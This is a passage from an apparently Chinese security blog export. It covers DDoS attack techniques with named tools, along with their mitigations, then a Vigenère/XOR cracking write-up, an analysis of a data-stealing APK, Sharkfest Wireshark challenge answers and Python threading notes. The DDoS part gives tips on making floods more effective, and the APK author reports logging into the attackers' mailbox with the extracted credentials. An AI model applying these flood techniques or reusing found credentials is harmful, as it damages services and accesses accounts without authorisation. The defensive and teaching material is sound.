计算资源进行加解密，并进行数据的有效性检验。然而，不论数据是否有效，服务器都必须先进行解密才能够做检查。攻击者可以利用这个特性进行 SSL 洪水攻击。 为了降低成本，攻击者需要在客户端进行的计算尽可能地少。因此，可以在数据传输前、进行 SSL 握手的过程中发动攻击。即：攻击者并不需要完成 SSL 握手和密钥交换，仅仅在这个过程中让服务器去解密和验证，以致大量消耗服务器的计算资源。 攻击工具：SSLSqueeze 攻击应用资源攻击 DNS 服务 DNS QUERY 洪水攻击 原理：主要是通过发送大量 DNS QUERY 的包，增大 DNS 服务器的处理压力，直至使其宕机。 因此，攻击方可以尽量构造不同域名的查询，以有效避开 DNS 服务器缓存中的解析记录，达到更好的资源消耗效果。 DNS NXDOMAIN 洪水攻击 作为 DNS QUERY 攻击的变种攻击，区别在于 DNS QUERY 查询的是一个真实存在的域名，而 DNS NXDOMAIN 攻击查询一个不存在的域名。 攻击 Web 服务 HTTP 洪水攻击 与其他攻击思路类似，攻击者操控大量肉鸡，向目标服务器发送大量 HTTP 请求，造成目标服务器处理缓慢甚至得不到处理，导致拒绝服务攻击。 由于 HTTP 协议是基于 TCP 协议的，需要完成三次握手建立 TCP 连接才能开始 HTTP 通信，因此 HTTP 洪水攻击时无法使用伪造源 IP 地址的方式发动攻击。攻击者通常使用 HTTP 代理服务器。 Web 服务也会有缓存机制。更高效的 HTTP 洪水攻击应不断发出针对不同资源和页面的 HTTP 请求，并尽可能请求无法被缓存的资源（如关键词搜索结果、用户相关资料等），从而加重服务器的负担，增强攻击效果。 对于支持 HTTPS 的 Web 服务器，进行 HTTPS 洪水攻击是更为有效的一种攻击方式。一方面，在进行 HTTPS 通信时，Web 服务器需要消耗更多的资源用来进行认证和加解密；另一方面，一部分防护设备无法对 HTTPS 通信数据流进行处理，也会导致攻击流量绕过设备，直接对 Web 服务器造成攻击。 Slowloris 攻击 在 HTP 协议中规定，HTTP 头部以连续的“\r\n\r\n”作为结束标志。许多 Web 服务器在处理 HTTP 请求的头部信息时，会等待头部传输结束后再进行处理。因此，如果 Web 服务器没有接受到连续的“\r\n\r\n”，就会一直接受数据并保持与客户端的连接。利用这个特性，攻击者能够长时间与 Web 服务器保持连接，并逐渐耗尽 Web 服务器的连接资源。 攻击者可以在发送 HTTP GET 请求时，缓慢地发送无用的 header 字段，并且一直不发送“\r\n\r\n”结束标志，以长时间占用与 Web 服务器的连接并保证该连接不被超时中断。而 Web 服务器能够处理的并发连接数是有限的，因此，攻击者可以耗尽 Web 服务器的连接资源，造成拒绝服务攻击。 工具：Slowloris、slowhttptest等。 摘自《破坏之王》 P91 在 Slowloris 攻击方法出现以后，IIS、nginx 等一部分 Web 服务器软针对该攻击方法进行了修改，但是 Apache、dhttpd 等 Web 服务器软件依然会受到 Slowloris 攻击的影响。 慢速 POST 请求攻击 在 HTTP 头部信息中，可以使用 Content-Length 字段来指定 HTTP 消息实体的传输长度。当 Web 服务器接收到的请求中含有 Content-Length 字段时，服务器会将该字段的值作为 HTTP BODY 的长度，持续接收数据并在达到 Content-length 值时对 HTTP BODY 的数据内容进行处理。利用这个特性，攻击者能够长时间与 Web 服务器保持连接，并逐渐耗尽 Web 服务器的连接资源。 攻击思路：攻击者在发送 HTTP POST 请求时，在请求头部中将 Content-Length 设置为一个很大的值，并以缓慢的速度发送 HTTP BODY 内容。以此来长时间占用这个连接，进而造成拒绝服务攻击。 工具：slowhttptest 数据处理过程攻击 Web 服务器在收到 HTTP 请求之后，需要检查并处理其中的数据，通过恶意构造请求数据的内容，攻击者可以显著地增加数据处理过程中的资源消耗，造成拒绝服务攻击。 正则表达式拒绝服务攻击（ReDoS） 对于很多用正则回溯法的引擎如NFA（非确定性有限状态自动机），处理“否定匹配”（即输入字符串与正则表达式不匹配）时，正则引擎需要对所有可能的匹配路径全部进行测试。 《破坏之王》P93-94： 如果位于 Web 应用中的正则表达式写得不够好，需要测试的匹配路径数量会随着输入字符串的长度呈指数级增长。利用恶意构造的输入字符串，攻击者只需要提交相对较短的输入字符串（30个字符左右）就可以强制正则引擎处理数亿个匹配路径，所需时间可以达到几个小时甚至几天。只需要几个这种类似的恶意正则表达式匹配请求，就能够完全占用 Web 服务器的计算资源，造成 Web 服务器拒绝服务。 哈希冲突拒绝服务攻击 攻击者构造一组恶意的 POST 数据，使得请求中的“键”的哈希值全部相同，那么保存 POST 数据的哈希表就会因此退化成为链表，对哈希表的查找和插入等操作则变成了对链表的遍历操作，造成大量的计算资源被占用，导致拒绝服务攻击。 混合攻击 攻击分类 洪水攻击 慢速攻击 网络层攻击 ICMP/IGMP 洪水攻击 传输层攻击 UDP 洪水攻击 Slowloris 攻击 &nbsp; TCP 洪水攻击 THC SSL DoS 攻击 &nbsp; SYN 洪水攻击 &nbsp; PSH+ACK 洪水攻击 &nbsp; ACK 反射攻击 &nbsp; RST 洪水攻击 &nbsp; SSL 洪水攻击 应用层攻击 DNS QUERY 洪水攻击 Slowloris 攻击 &nbsp; DNS NXDOMAIN 洪水攻击 慢速 POST 请求攻击 &nbsp; DNS 放大攻击 数据处理过程攻击 &nbsp; HTTP 洪水攻击 &nbsp; NTP 放大攻击 &nbsp; SNMP 放大攻击 DDoS 攻击的防御攻击的治理僵尸网络的治理 难题 进行僵尸网络治理的首要困难在于，我们只有能够检测到网络异常，才能够知道系统感染了僵尸程序。 检测到感染，提取到样本，需要对样本进行逆向分析，找出需要的信息。 手段 根据逆向分析的结果，编写僵尸程序清除工具，分发至企业局域网的其他感染主机进行清除处理。 接管或摧毁整个僵尸网络。 地址伪造攻击的治理 难题 根据 TCP/IP 协议内容，无法根除此问题。 手段 CERT Advisory CA-1996-21 路由过滤。互联网服务提供商在网络出入口处的路由器上，对符合以下条件的数据包进行过滤： - 从外部接口进入内部网络的数据包，但源地址属于内部网络； - 由内部网络向外发送的数据包，但是源地址不属于内部网络。 RFC 2827 攻击者位于 222.222.222.0/24 网段，属于 ISP D 的区域，通过路由器 Router 2，试图攻击其他主机。如果 Router 2 执行了入口流量过滤，只允许源地址在 222.222.222.0/24 网段内的数据包流出，反之则全部禁止，那么攻击将无法进行。 Unicast Reverse Path Forwarding 对于 Input 方向的数据包，检查访问控制列表 ACL 是否允许通过； 按照 Unicast RPF 检查是否由最优路径抵达； Forwarding Information Base（FIB）查找； 对于 Output 方向，检查访问控制列表 ACL 是否允许通过； 转发数据包。 在 IETF 的最佳实践 BCP 84 中对这种方式有较详细的介绍，这份文档名为 Ingress Filtering for Multihomed Networks 分布式过滤方法 路由器根据数据包的源地址和目的地址判断其转发路径是否经过自己。如果不经过，则丢弃该数据包。 攻击反射点的治理（以 DNS 举例） 手段 Open Reslover Project RRL NIST SP 800-81 攻击的缓解 缓解 DDoS 攻击的主要方法是对网络流量进行清洗，即设法将恶意的网络流量从全部流量中去掉，只将正常的网络交付该服务器。然而，随着分布式拒绝服务攻击的流量不断增大，单一的流量清洗设备和流量清洗中心已经无法处理如此大规模的网络流量了，因此面对当今的 DDoS 攻击时，再进行流量清洗前还需要进行流量稀释。 攻击流量的稀释 CDN CDN 技术的初衷是提高互联网用户对网站静态资源的访问速度，但是由于分布式多节点的特点，它也能够对分布式拒绝服务攻击的流量产生稀释的作用。 所谓 CDN，就是在互联网范围内广泛设置多个节点作为代理缓存，并将用户的访问请求导向最近的缓存节点（通常通过智能 DNS 来实现），以加快访问速度的一种技术手段。 传统 DNS智能 DNS CDN 技术对于通过域名发起的分布式拒绝服务攻击的流量分散和稀释有较大作用。 Anycast 任播 在网络寻址中，任播是指网络地址和网络节点为一对多的关系，每一个目的地址对应一群接受节点，但消息只会发送给拓扑结构上最近的节点。Anycast 通常是通过在不同的节点处同时使用 BGP 协议向外声明同样的 IP 地址的方式实现的。如下图： 路由器 1 眼中的网络拓扑结构：因此，路由器 1 会优先将用户的请求报文转发给路由器 2，从而实际到达了服务器 A。这就缓解了针对 IP 地址进行攻击的问题。 攻击流量的清洗优秀的流量清洗设备，应该能够同时将误报率和漏报率降低到可以接受的程度，这样就能够在不影响网络或业务系统正常运行的情况下，最大限度地将恶意攻击流量从全部网络中去除 IP 信誉检查类比于白名单、黑名单 攻击特征匹配 很多攻击过程会借助工具，为了提高发送请求的效率，攻击工具发出的数据包通常是由编写者伪造并固化到工具当中，而不是在交互过程中产生的，因此一种攻击工具所发出的数据包载荷会具有一些特征。 流量清洗设备可以将这些数据包载荷中的特征作为指纹，来识别工具发出的攻击流量。 指纹识别包括静态指纹识别和动态指纹识别。静态是指预先将多种攻击工具的指纹特征保存在流量清洗设备内部，设备将经过的网络数据包与内部的特征库进行比对，直接丢弃符合特征的数据包；动态指纹识别则需要清洗设备对流过的网络数据包进行学习，在学习到若干个数据包的载荷部分之后，将其指纹特征记录下来，后续命中这些指纹特征的数据包会被丢弃，而长期不被命中的指纹特征会逐渐老化直至消失。 速度检查与限制 eg1：受到THC SSL DoS 攻击时，会在同一个 SSL 会话中多此进行加密密钥的重协商（正常情况下不会这样）。因此，当流量清洗设备进行统计时，如果发现 SSL 会话中密钥重协商的次数超过了特定阀值，就可以直接中断这个会话并把来源加入黑名单。 eg2：受到 Slowloris 和慢速 POST 请求攻击时，客户端和服务器之间会以非常低的速率进行交互和数据传输。流量清洗设备在发现 HTTP 的请求长时间没有完成传输时，就可以将会话中断。 对于 UDP 洪水攻击等一些没有明显特征、仅通过大流量进行攻击的方法，可以通过限制流速的方式对其进行缓解。 TCP 代理和验证 协议完整性验证 在 DNS 解析过程中，如果域名解析请求获得的响应数据中 Flags 字段的 Truncated 位被置换，通常客户端就会使用 TCP 53 端口重新发送域名解析请求 攻击者使用的工具由于不接受或不处理解析请求的相应数据，也就不会使用 TCP 53 端口进行重新连接。流量清洗设备可以利用这个区别来有效地区分合法用户与攻击者，拦截恶意的 DNS 攻击请求。 对于提供 HTTP 服务的 Web 服务器，可以使用HTTP 协议中的 302 重定向来验证请求的来源是否接受了响应数据并完整实现了 HTTP 协议的功能。HTTP 的 302 状态码表示被请求的资源被临时转移，并会给出一个转移后的地址。正常合法用户在接收到 302 重定向后会顺着跳转地址寻找对应的资源： 而攻击者的攻击工具由于不接收或不处理响应数据，则不会进行跳转，因此攻击请求会被清洗设备拦截，Web 服务器不会受到任何影响 ： 客户端真实性验证 有些攻击工具在开发过程中使用了现成的协议库，这样就能够完整实现协议交互，通过协议完整性检验。对于这些攻击工具，需要使用客户端真实性验证技术进行攻击流量清洗。 客户端真实性验证是指对客户端程序进行挑战-应答式的交互验证（如各类验证码）。 对基于页面的 Web 服务，可以通过检查客户端是否支持 JavaScript 来验证请求是否来自真实的浏览器客户端。例子–正常客户端的脚本验证： 伪造客户端攻击的流量清洗： 参考 《破坏之王——DDoS攻击与防范深度剖析》 乌云知识库]]></content>
      <tags>
        <tag>DDoS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[由一道Vigenere想到的造轮子]]></title>
    <url>%2F2017%2F09%2F23%2F%E7%94%B1%E4%B8%80%E9%81%93Vigenere%E6%83%B3%E5%88%B0%E7%9A%84%E9%80%A0%E8%BD%AE%E5%AD%90%2F</url>
    <content type="text"><![CDATA[插播广告，这是crypto-online 前几次的密码学课程上，几乎每次上课前都会做几道题目（其中包括去解一些古典密码，如Vigenere等）emmm… ，所以就想做一个关于常见古典密码加解密的工具，而碰巧得知编程语言中的 “网红” javascript有一个强大的加解密库 —— CryptoJS，就萌生了建个线上加解密的小站。完全代码见github，还在建设中，大家如果有一些好的想法和建议，欢迎指点交流 ^ _ ^ 广告打完了，扯一扯正题 在写crypto-online之前，密码学老师给我们发了一道破解Vigenere的题，异或加密，让我们没事儿的时候做一做。 这题是这样的，已知十六进制编码的密文，密钥长度1-13字节，每一位都是0-255 随机的ascii（密钥可以不在可打印字符内） 在假设密钥长度为n的情况下，常规套路都是将密文分成n段，统计词频 1234567891011c = '''十六进制密文'''cl = [ c[i:i+2] for i in range(0, len(c), 2) ]# 先将连续的十六进制密文分割，形成元素均为十六进制数的列表from collections import Counter# 导入Counter模块，统计词频count = [ cl[i::n] for i in range(n) ]# cl[i::n] 将cl列表中的n个元素分为一组，且将每组中下标为i的元素组合成一个列表，count 为n个列表组成的列表 然后就是将count中每个列表的词频最高的元素与&#39; &#39;或&#39;e&#39;（英文中词频较高的字符）异或，得出密钥 但在这里，密钥长度未知，幸运地是咱们知道其长度，我想到的是通过异或后的明文反馈，如果前密钥长度个字符的ascii在32～126范围中，那么我们可以把密钥长度、密钥保留下来，再进行后续解密处理。 做题的时候突然想，词频说到底是概率，并不是所有文章的最高词频都是&#39; &#39;或&#39;e&#39;，因此，如果采用通过明文反馈的方法，未免会落下许多可能情况（例如密钥长度为7，每个位都应该至少与&#39; &#39;, &#39;e&#39;, &#39;t&#39;异或，那么就得考虑至少3^7种可能） 开始造轮子吧 首先，再次明确一下需要解决的问题，假设有一个空间chs = [ &#39; &#39;, &#39;e&#39;, &#39;t&#39; ]，密钥长度为7，我们需要配出3^7两两互不相同的组合 这问题很像排列组合，itertools中的permutations就是解决排列组合的问题，但是显然与本需求不符，不知道python里还有没有其他库提供这种方法，作为一个渣渣，只能自己造轮子了。。。 定义高词频列表：chs = [ &#39; &#39;, &#39;e&#39;, &#39;t&#39; ] 假设现在有了词频统计结果，每组的最高词频记录在列表里：words 让words里的每个元素分别和chs所有元素异或，保存：ch_xor_word = map(lambda x:[ str( int(x, 16)^ord(ch) ) for ch in chs ], words) 下面定义两个函数： 1234567891011121314151617181920212223def combine(x, y): tmp = [] for i in x: for j in y: tmp.append([i, j]) return tmp# 将内嵌列表展开，代码参考这篇博客 http://blog.csdn.net/vola9527/article/details/68964144def flatten(list_in): list_out = [] while 1: if list_in == []: break for index, val in enumerate(list_in): if type(val) is types.ListType: list_in = val + list_in[index+1:] break else: list_out.append(val) list_in.pop(index) break return list_out 最后一步：ans = map( flatten, reduce(combine, ch_xor_word) ) 解释一下第5步，举个例子： 1234# 先看一下flatten的具体作用&gt;&gt;&gt; test0 = [ ['a', 'b'], 'c', [ 'd', ['e', 'f'] ], 'g' ]&gt;&gt;&gt; flatten(test0)&gt;&gt;&gt; [ 'a', 'b', 'c', 'd', 'e', 'f', 'g' ] 123456789101112# 结合combine和reduce&gt;&gt;&gt; ch_xor_word = [ ... ['182' , '143', '156' ], ... [ '145', '194', '128' ], ... [ '21', '103', '97' ]... ]&gt;&gt;&gt; un_flatten = reduce(combine, ch_xor_word)[[['182', '145'], '21'], [['182', '145'], '103'], [['182', '145'], '97'], [['182', '194'], '21'], [['182', '194'], '103'], [['182', '194'], '97'], [['182', '128'], '21'], [['182', '128'], '103'], [['182', '128'], '97'], [['143', '145'], '21'], [['143', '145'], '103'], [['143', '145'], '97'], [['143', '194'], '21'], [['143', '194'], '103'], [['143', '194'], '97'], [['143', '128'], '21'], [['143', '128'], '103'], [['143', '128'], '97'], [['156', '145'], '21'], [['156', '145'], '103'], [['156', '145'], '97'], [['156', '194'], '21'], [['156', '194'], '103'], [['156', '194'], '97'], [['156', '128'], '21'], [['156', '128'], '103'], [['156', '128'], '97']]&gt;&gt;&gt; map( flatten, un_flatten )[['182', '145', '21'], ['182', '145', '103'], ['182', '145', '97'], ['182', '194', '21'], ['182', '194', '103'], ['182', '194', '97'], ['182', '128', '21'], ['182', '128', '103'], ['182', '128', '97'], ['143', '145', '21'], ['143', '145', '103'], ['143', '145', '97'], ['143', '194', '21'], ['143', '194', '103'], ['143', '194', '97'], ['143', '128', '21'], ['143', '128', '103'], ['143', '128', '97'], ['156', '145', '21'], ['156', '145', '103'], ['156', '145', '97'], ['156', '194', '21'], ['156', '194', '103'], ['156', '194', '97'], ['156', '128', '21'], ['156', '128', '103'], ['156', '128', '97']] 结合reduce的类似递归的特性，轮子造完了，好像有点蠢。。。 后记 在写这篇博文的时候，又想到了一种方法，可以将[ &#39; &#39;, &#39;e&#39;, &#39;t&#39; ]视为三进制，假设密钥长度仍然为7： 定义一个集合： 1chs = &#123; '0': ' ', '1': 'e', '2': 't' &#125; 自定义一个十进制转三进制的函数： 1234567def ten2three(num): l = [] while num&gt;0: num, bit = divmod( num, 3 ) l.append(str(bit)) l.reverse() return ''.join(l) 最后，得到3^7=2187种两两不同的组合: 1234&gt;&gt;&gt; test0 = map(lambda x:''.join([ chs[i] for i in ten2three(x).zfill(7) ]), range(0, 3**7) )&gt;&gt;&gt; from collections import Counter&gt;&gt;&gt; len(Counter(test0))2187 分割线。。。果然还是太菜了，itertools 提供了product方法，目的是生成笛卡尔积，这正是要解决的问题，还是以chs = [ &#39; &#39;, &#39;e&#39;, &#39;t&#39; ]来看:所以说，为了防止造更多轮子，还是应当把官方文档一些常用库过一遍～ 对于Vigenere密钥长度的爆破 前段时间看到过一篇文章，讲述的是针对Vigenere唯密文爆破密钥长度，采用的方法是通过计算两个等长字符串的汉明距离，并进行归一化处理，得到的最小值最有可能和密钥长度相关。 比如说，密钥长度n在2～100之间，取密文的前n个字符连接成的字符串与第n+1～2n个字符连接成的字符串，计算两者的汉明距离，并进行归一化处理。统计2～100之间所有的情况，并对结果进行排序，与最小值相关的n可认为最接近真实密钥长度。 试了下我遇到的这道题，从1～13里取值，确实得到密钥长度为7。知道了密钥长度，再结合词频统计的结果，就不难得出答案了。]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次简单的恶意apk逆向分析]]></title>
    <url>%2F2017%2F08%2F01%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%81%B6%E6%84%8Fapk%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[故事起因 估计也会有很多同学升学时其亲友收到过这样的短信： xxx家长您好，这是您孩子的升学资料 xxx.com 请查看 blablabla～ 家人最近也收到了类似的短信，一开始我的心情是比较紧张的，毕竟前不久考完期末。。。 结果访问该网址后发现是自动下载一个apk文件，360发出了警告， emmm……突然就来了兴趣-。- 分析过程 之前从未接触过android逆向方面的东西，起初我也是上网找了找apk病毒分析的相关资料（这里推荐一篇文章），感觉只要能读到源码一切也就简单了。遂下载了这个apk文件，开始分析（xjb搞）。 下载下来的自然是apk后缀，将其改为rar，然后在win下解压 解压后有一个classes.dex文件 我们都知道android开发语言是Java，Java 源代码经过 Java 编译器编译后生成 .class 文件，android SDK 自带的工具会将这些 .class文件转换成classes.dex, 而classes.dex就是运行在Dalvik虚拟机上的文件。 将classes.dex拖至dex2jar的安装目录下，打开命令行并切换至dex2jar的目录下，运行d2j-dex2jar.bat classes.dex将产生一个名为classes-dex2jar.jar的文件 在jd-gui中打开classes-dex2jar.jar文件，开始找敏感字段，当然，代码经过了混淆处理 既然是apk文件，那么制造木马者一定想要窃取用户一些信息，最重要的自然是将这些信息发送出去，可以判断是邮箱或是手机号等等。那么尝试全局搜索（shift+ctrl+s）mail、smtp、@qq.com等等关键字，也可以慢慢审计代码摸清主要逻辑，去挖掘更多好玩的东西-。-我是搜smtp，直接就把189邮箱的账户、密码爆出来了。。。 继续深入 既然找到账户、密码，抱着研究型的态度，我决定登录进去。这里可以看到，所有下载了文件的用户的部分通讯录、短信被发送到该邮箱下 再看部分源码 从微步在线威胁情报分析上得到的结果点了几个相似的域名都是 apk 文件下载地址，文件名也很有欺骗性，如 “车辆违规查询”、“体检报告单”等等。 简单小结 能力有限，分析得比较水 0_0，对很多方面没有深入研究 出于安全考虑，android 用户尽量注意别轻易下载未知的 apk 文件 最后把这些信息交给互联网检举中心，至于他们有没有处理，我就不得而知了]]></content>
  </entry>
  <entry>
    <title><![CDATA[Tips-of-Sharkfest_Challenge_2016]]></title>
    <url>%2F2017%2F03%2F03%2FTips-of-Sharkfest-Challenge-2016%2F</url>
    <content type="text"><![CDATA[前言 Sharkfest Challenge对于学习wireshark来说是个非常不错的挑战赛，2016年的还没有在网上找到解题思路，索性就自己写一篇（强迫自己写博客学习:)） sf2016-a1. What IP addresses are used by Laura’s iPad? 首先看到iPad，想到可以从物理地址名字解析中筛选出Apple开头的地址，Statistics-&gt;Conversations： 通过eth.addr筛选 地址有：0.0.0.0, 192.168.1.66, fe80::8f5:de86:f16e:a500, 2602:301:7786:9aa0:452:a774:5191:841a 2. What is the IPv4 address of the host that is attempting to discover a Cannon printer/scanner? 查找Cannon、printer、scanner等字段 找到该layer sender为192.168.1.70 3. Which DNS response transaction IDs contained the largest number of Answer RRs? filter： dns.count.answer &gt; 15(这个数字可以从1往上加，以筛选出最大值) 找到transaction IDs分别为：0x5813， 0x99c9(answer RRs is 18) 4. What is the largest DNS response time seen in this trace file? filter： dns.time &gt; 1 找到time为1.104968000 5. What website is the user browsing for ceiling fans? Ctrl-F 搜索 ceiling字段 找到包含该字段的http协议的包，Follow TCP Stream 主机如图：www.wayfair.com sf2016-b1. How many cipher suites are offered to the www.bing.com server? filter：ssl.handshake.ciphersuite 展开ssl层 如上图：cipher suite（26），所以答案为26个 2. Which cipher suite did th www.bing.com server select to use for the connection? 这题存在疑问，答案是TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 3. What host name query is generating DNS errors? filter：DNS 找出DNS response中flags包含Refused的字段，如： 可以发现该DNS response包没有对DNS查询做出Answer，说明要查询的主机在DNS查询过程中生成了错误，该主机名为：wpad.attlocal.net 4. Who owns the iPad detected in this trace file? 按照sf2016-a第一题的方法，筛选规则为eth.addr == c8:f6:50:e4:15:2d 见MDNS的展开： Pat’s iPad…(答案为 Pat) 5. What server is the client connecting to in TCP stream 8? filter：tcp.stream wq 8 找到52.202.146.168 Statistics-&gt;Show address resolution 找到该ip对应的主机名：files-weighted.r53.acrobat.com sf2016-c1. How many days are covered by the Money Back Guarantee for HotAlarmClock? http过滤 Ctrl+F 搜索 “money” 将找到这个包 找到其回复的包，拉开Packet List 右击HTTP下面的GIF层，点击Export Selected Packet Bytes（将该图像导出） 如图可知，答案为30天 2. Which content delivery network(CDN) is used by Microsoft? 从filter：dns过滤后的DNS responses中找到关于microsoft的解析，会找到Akamai的CDN 3. What caused the DNS client to send an ICMP message to a DNS response? 经过filter：dns筛选后找到该ICMP是frame 1179 展开其Packet List 发现Request in 1170 但是1171就是1170的DNS response（Transaction ID都是0x203b） 所以，frame 1178是DNS server多发的一个DNS响应包，而DNS client在接受到frame 1171后即与DNS server断开连接，所以frame 1179是对frame 1178回了一个ICMP（Destination Unreachable） 4. How many complete TCP handshakes are seen in this trace file? tcp.flags == 0x12（筛选出syn/ack的包） 23个 5. What is the host name of the system that offers the largest TCP window scale multiplier? filter：tcp.window_size_scalefactor&gt;1023 找到提供最大TCP窗口缩放倍数的主机ip：63.245.213.48 Statistics-&gt;Show address resolution，找到其对应的主机名为：aus5.external.zlb.scl3.mozilla.com 通过filter：dns筛选后，Ctrl-F 搜索 “63.245.213.48”，发现这是一个cname主机的ip 因此，题目要求的主机名为：aus5.mozilla.org sf2016-d1. Who owns an iPod Touch? 直接Ctrl-F(Packet details) 搜索 “iPod” 2. Why did Wireshark mark Frame 11 as a Spurious Retransmission? 找到frame 11，展开TCP layer，经分析，Seq 132（用的是relative sequence number）已经在frame 10中收到了ACK回复 3. How many Gratuitous ARPs are in this trace file? filter：arp.isgratuitous == 1 12个 4. What is getting “hairy”? Ctrl-F（Packet details）搜索 “hairy”，发现在一些HTTP的GET里有这样一句话：”purdy-sharks-series-blues-getting-hairy” 5. Why was a user redirected when connecting to www.wireshark.org? 在frame 2467的HTTP layer展开中看到，Location是https://www.wireshark.org，而不是http://www.wireshark.org，即重定向到https页面上 sf2016-e1. Who or what is “awesome”? Ctrl—F（Packet details）搜索“awesome”，找到 2. What is the IP address of the DHCP Relay Agent? filter：bootp.ip.relay != 0.0.0.0 找到该IP：172.19.131.119 3. ow many TCP FIN packets are marked as spurious retransmissions? Statistics-&gt;Packet Lengths，过滤条件为 tcp.analysis.spurious_retransmission 初步判断为533个 再看40～79的部分，有446个，这部分基本上就是不包含数据部分的TCP控制数据包 最后查看80～159部分的两个数据包，frame.cap_len == 89的数据包是存在问题的TCP包，frame.cap_len == 153的多了一个SSL层 Sharkfest Challenge官网给出的答案是446 4. What manufacturer’s products are looking for 169.254.255.255? Ctrl-F搜索“169.254.255.255”，展开ARP层，发现Sender Mac Address 是Apple_03:b2:24，所以这是Apple厂商的设备 5. How many IP hosts advertise a window scaling factor of 128? Statistics-&gt;Conversations-&gt;Limit to display filter(tcp.window_size_scalefactor == 128) 小结 wireshark可谓是分析数据包的神器，其中有很多优秀的功能，如Statistics等，有些filter的表达式不知道怎么去写，可以打开Expressions查看 Sharkfest Challenge也是旨在帮助大家更好地使用wireshark，解决实际问题，最早的Challenge时从2013年开始的，感兴趣的也可以看看之前的题目]]></content>
      <categories>
        <category>proto</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python与多线程]]></title>
    <url>%2F2017%2F02%2F27%2Fpython%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[多线程 让许多独立的任务同时运行 使用多线程编程时，一个编程任务可以规划成几个执行特定函数的线程UserRequestThread：负责读取客户端输入，该输入可能来自I/O通道。程序将创建多个线程，每个客户端各一个，客户端的请求将会被放入队列中。RequestProcessor：该程序负责从队列中获取请求并进行处理，为第3个线程提供输出。ReplyThread：负责向用户输出，将结果传回给用户（如果是网络应用），或者把数据写到本地文件系统或数据库中。 多线程编程对于具有如下特点的编程任务而言是非常理想的：本质上是异步的；需要多个并发活动；每个活动的处理顺序可能是不确定的（或者说是随机的、不可预测的） 进程与线程进程（有时称为重量级进程） 计算机程序只是存储在磁盘上的可执行二进制（或其他类型）文件。而进程就是一个正在执行的程序，并且一个CPU同一时间只能运行一个进程 进程也可以通过派生（fork或spawn）新的进程来执行其他任务，不过因为每个新进程也都拥有自己的内存和数据栈等，所以只能采用进程间通信（IPC）的方式共享信息 线程（有时称为轻量级进程） 与进程类似，不过它们是在同一个进程下的 包括开始、执行顺序和结束三部分 有一个指令指针，用于记录当前运行的上下文 当其他线程运行时，它可以被抢占（中断）和临时挂起（也称sleep）—— 这种方法叫做让步 进程与线程 线程是最小的执行单元，而进程由至少一个线程组成 多线程的执行方式与多进程是一样的，也是由操作系统在多个线程之间快速切换，让每个线程都短暂地交替运行，看起来就像同时执行一样（当然，真正地同时执行多线程需要多核CPU才能实现） 一个进程至少由一个线程构成，其各个线程与主线程共享同一片数据空间，相比于独立的进程而言，线程间的信息共享和通信更加容易 守护线程 当主线程退出时，所有子线程都将停止，不管它们是否仍在工作 守护线程一般是一个等待客户端请求服务的服务器，如果没有客户端请求，守护线程就是空闲的，如果把一个线程设置为守护线程，就表示这个线程是不重要的，进程退出时不需要等待这个线程执行完成 Python与多线程全局解释器锁（GIL） Python代码的执行是由Python虚拟机（又名解释器主循环）进行控制的，Python在设计时是这样考虑的，在主循环中同时只能有一个控制线程在执行，就像单核CPU系统中的多进程一样。内存中可以有许多程序，但是在任意给定时刻只能有一个程序在运行。同理，尽管Python解释器中可以运行多个线程，但是在任意给定时刻只有一个线程会被解释器执行 《python核心编程》里这样写道 对Python虚拟机的访问是由GIL控制的。这个锁就是用来保证同时只能有一个线程运行的。在多线程环境中，Python虚拟机将按照下面所述的方式执行1.设置GIL2.切换进一个线程去运行3.执行下面操作之一&nbsp;&nbsp;&nbsp;&nbsp;a. 指定数量的字节码指令&nbsp;&nbsp;&nbsp;&nbsp;b. 线程主动让出控制权（可以调用time.sleep(0)来完成）4.把线程设置回睡眠状态（切换出线程）5.解锁GIL6.重复上述步骤 在这里推荐一篇文章，详细介绍了GIL 由于Python的GIL的限制，多线程更适合于I/O密集型应用（I/O释放了GIL，可以允许更多的并发），而不是计算密集型应用。 几个模块 threading（相比较而言，thread模块有诸多缺点）使用Thread类，可以有很多方法来创建线程 1.创建Thread的实例，给它一个函数2.创建Thread的实例，给它一个可调用的类实例3.派生Thread的字类，并创建子类的实例（class MyThread(threading.Thread)） import threading class MyThread(threading.Thread): def __init__(self, func, args, name=&apos;&apos;): threading.Thread.__init__(self): self.name = name self.func = func self.args = args def yourFunc(): pass ... def run(self): your code ... subprocess这是派生进程的主要替代方案，可以单纯地执行任务，或者通过标准文件（stdin、stdout、stderr）进行进程间通信。 multiprocessing该模块允许为多核或多CPU派生进程，其接口与threading模块非常相似。该模块同样也包括在共享任务的进程间传输数据的多种方式from multiprocessing import Pool引用进程池 threadpoolpython库中的线程池，基本用法为： 1234&gt;&gt;&gt; pool = threadpool.ThreadPool(poolsize) &gt;&gt;&gt; requests = threadpool.makeRequests(some_callable, list_of_args, callback)&gt;&gt;&gt; [pool.putRequest(req) for req in requests]&gt;&gt;&gt; pool.wait() 将《python核心编程》（第3版）示例4-12的生产者-消费者改成线程池 concurrent.futures一个新的高级库，它只在“任务”级别进行操作，也就是说，你不再需要过分关注同步和线程/进程的管理了。你只需要指定一个给定了“worker”数量的线程/进程池，提交任务，然后整理结果。 Queue供多线程使用的同步先入先出队列 同步原语 在多线程代码中，当一些特定的函数或代码快不希望（或不应该）被多个线程同时执行，通常包括修改数据库、更新文件或其他会产生竞态条件的类似情况发生，就需要使用同步。 锁示例多个线程对同一临界区进行访问与操作I/O与访问相同的数据结构都属于临界区，因此需要用锁来防止多个线程同时进入临界区（临界区指的是一个访问共用资源的程序片段，而这些共用资源又无法同时被多个线程访问的特性） 12345import threadinglock = threading.Lock()lock.acquire()...lock.release() 信号量一个计数器，当资源消耗时递减，当资源释放时递增，可以认为信号量代表它们的资源可用或不可用。下面是《python核心编程》（第3版）示例4-11的代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from threading import BoundedSemaphore, Lock, Thread from atexit import register from random import randrange from time import ctime lock = Lock() MAX = 5 candytray = BoundedSemaphore(MAX) def refill(): lock.acquire() 